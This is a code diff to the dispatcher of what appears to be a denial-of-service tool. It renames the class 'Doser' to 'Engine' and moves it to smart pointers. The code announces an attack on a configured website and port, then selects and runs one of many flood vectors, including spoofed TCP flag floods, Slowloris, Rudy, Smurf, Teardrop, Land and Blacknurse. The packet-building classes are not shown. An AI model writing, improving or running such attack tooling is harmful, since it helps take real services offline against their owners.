@@ -1,11 +1,12 @@
 #include <unistd.h>
 #include <array>
+#include <memory>
 
-#include "../Headers/Doser.hpp"
+#include "../Headers/Engine.hpp"
 #include "../Headers/Attack_Vectors.hpp"
 
-void Doser::run() {
-    Attack_Vector *flood = nullptr;
+void Engine::run() {
+    std::unique_ptr<Attack_Vector> flood;
     std::string message = std::string("Attacking ") + conf->website + ":" + conf->port + " with "
                           + std::to_string(conf->THREADS) + " Threads, "
                           + std::to_string(conf->CONNECTIONS) + " Connections";
@@ -14,85 +15,85 @@ void Doser::run() {
     logger->Log(&message, Logger::Warning);
 
     switch(conf->vector){
-        case config::HTTP:
+        case Config::HTTP:
             logger->Log("Attack Vector: HTTP", Logger::Info);
-            flood = new Http_Flood{conf, logger};
+            flood = std::make_unique<Http_Flood>(conf, logger);
             break;
-        case config::NullTCP:
+        case Config::NullTCP:
             logger->Log("Attack Vector: NullTCP", Logger::Info);
-            flood = new Null_Flood{conf, logger};
+            flood = std::make_unique<Null_Flood>(conf, logger);
             break;
-        case config::NullUDP:
+        case Config::NullUDP:
             logger->Log("Attack Vector: NullUDP", Logger::Info);
-            flood = new Null_Flood{conf, logger};
+            flood = std::make_unique<Null_Flood>(conf, logger);
             break;
-        case config::UDPFlood:
+        case Config::UDPFlood:
             logger->Log("Attack Vector: UDPFlood", Logger::Info);
-            flood = new Http_Flood{conf, logger};
+            flood = std::make_unique<Http_Flood>(conf, logger);
             break;
-        case config::TCPFlood:
+        case Config::TCPFlood:
             logger->Log("Attack Vector: TCPFlood", Logger::Info);
-            flood = new Http_Flood{conf, logger};
+            flood = std::make_unique<Http_Flood>(conf, logger);
             break;
-        case config::Slowloris:
+        case Config::Slowloris:
             logger->Log("Attack Vector: Slowloris", Logger::Info);
-            flood = new Slowloris{conf, logger};
+            flood = std::make_unique<Slowloris>(conf, logger);
             break;
-        case config::Rudy:
+        case Config::Rudy:
             logger->Log("Attack Vector: Rudy", Logger::Info);
-            flood = new Slowloris{conf, logger};
+            flood = std::make_unique<Slowloris>(conf, logger);
             break;
-        case config::ICMPFlood:
+        case Config::ICMPFlood:
             logger->Log("Attack Vector: ICMP Flood", Logger::Info);
-            flood = new ICMP_Flood{conf, logger};
+            flood = std::make_unique<ICMP_Flood>(conf, logger);
             break;
-        case config::Blacknurse:
+        case Config::Blacknurse:
             logger->Log("Attack Vector: Black Nurse", Logger::Info);
-            flood = new ICMP_Flood{conf, logger};
+            flood = std::make_unique<ICMP_Flood>(conf, logger);
             break;
-        case config::SpoofedSyn:
+        case Config::SpoofedSyn:
             logger->Log("Attack Vector: Spoofed Syn Flood", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::SpoofedAck:
+        case Config::SpoofedAck:
             logger->Log("Attack Vector: Spoofed Ack Flood", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::SpoofedRST:
+        case Config::SpoofedRST:
             logger->Log("Attack Vector: Spoofed Rst Flood", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::SpoofedURG:
+        case Config::SpoofedURG:
             logger->Log("Attack Vector: Spoofed Urg Flood", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::SpoofedPUSH:
+        case Config::SpoofedPUSH:
             logger->Log("Attack Vector: Spoofed Push Flood", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::SpoofedFin:
+        case Config::SpoofedFin:
             logger->Log("Attack Vector: Spoofed Fin Flood", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::SpoofedUDP:
+        case Config::SpoofedUDP:
             logger->Log("Attack Vector: Spoofed UDP", Logger::Info);
-            flood = new Spoofed_UDP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_UDP_Flood>(conf, logger);
             break;
-        case config::Beast:
+        case Config::Beast:
             logger->Log("Attack Vector: Beast", Logger::Info);
-            flood = new Beast{conf, logger};
+            flood = std::make_unique<Beast>(conf, logger);
             break;
-        case config::TearDrop:
+        case Config::TearDrop:
             logger->Log("Attack Vector: Teardrop", Logger::Info);
-            flood = new Spoofed_UDP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_UDP_Flood>(conf, logger);
             break;
-        case config::Land:
+        case Config::Land:
             logger->Log("Attack Vector: Land", Logger::Info);
-            flood = new Spoofed_TCP_Flood{conf, logger};
+            flood = std::make_unique<Spoofed_TCP_Flood>(conf, logger);
             break;
-        case config::Smurf:{
+        case Config::Smurf:{
             logger->Log("Attack Vector: Smurf", Logger::Info);
-            flood = new ICMP_Flood{conf, logger};
+            flood = std::make_unique<ICMP_Flood>(conf, logger);
             break;
         }
         default:break;
@@ -108,10 +109,9 @@ void Doser::run() {
     }
     logger->Log("Press <Ctrl+C> to stop\n", Logger::Info);
     usleep(1000000);
-
     flood->run();
 }
 
-Doser::Doser(config *conf, Logger *logger) : conf{conf}, logger{logger} {
+Engine::Engine(Config *conf, Logger *logger) : conf{conf}, logger{logger} {
 
 }
